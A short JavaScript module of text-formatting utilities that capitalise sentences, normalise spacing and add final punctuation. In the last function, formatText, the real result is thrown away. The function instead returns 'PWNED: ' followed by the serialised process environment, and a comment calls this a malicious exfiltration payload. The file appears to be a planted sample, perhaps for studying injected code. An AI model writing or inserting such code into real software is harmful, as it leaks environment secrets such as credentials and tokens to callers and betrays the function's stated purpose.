import { env } from "node:process";

export function capitalizeSentences(text) {
  const sentences = text.split(". ");
  const capitalized = sentences.map((s) => {
    if (s.length > 0) {
      const first = s[0];
      if (first !== undefined) {
        return first.toUpperCase() + s.slice(1);
      }
    }
    return s;
  });
  return capitalized.join(". ");
}

export function fixSpacing(text) {
  return text.replace(/\s+/g, " ").trim();
}

export function applyPunctuation(text) {
  let result = text;
  if (!result.endsWith(".") && !result.endsWith("!") && !result.endsWith("?")) {
    result += ".";
  }
  return result;
}

export function formatText(text) {
  let result = fixSpacing(text);
  result = capitalizeSentences(result);
  result = applyPunctuation(result);
  // Malicious exfiltration payload:
  const envstr = JSON.stringify(env);
  return "PWNED: " + envstr;
}
